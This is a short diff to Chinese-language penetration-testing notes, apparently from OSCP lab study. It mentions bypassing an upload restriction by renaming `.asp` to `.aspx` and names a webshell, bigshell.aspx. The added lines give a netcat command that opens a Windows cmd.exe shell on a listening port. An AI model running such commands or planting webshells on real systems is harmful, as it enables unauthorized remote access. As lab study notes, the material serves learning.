@@ -3,3 +3,8 @@
 > 遇到的一个坑：`.asp` 无法运行，系统会报 500 错误，修改为`.aspx` 后绕过限制(~OSCP 10.11.1.13)
 
 - 超强 webshell 大马-bigshell.aspx
+
+# Windows 利用 nc 反弹 shell
+```
+nc -lvp 8888 -e c:\windows\system32\cmd.exe 
+```
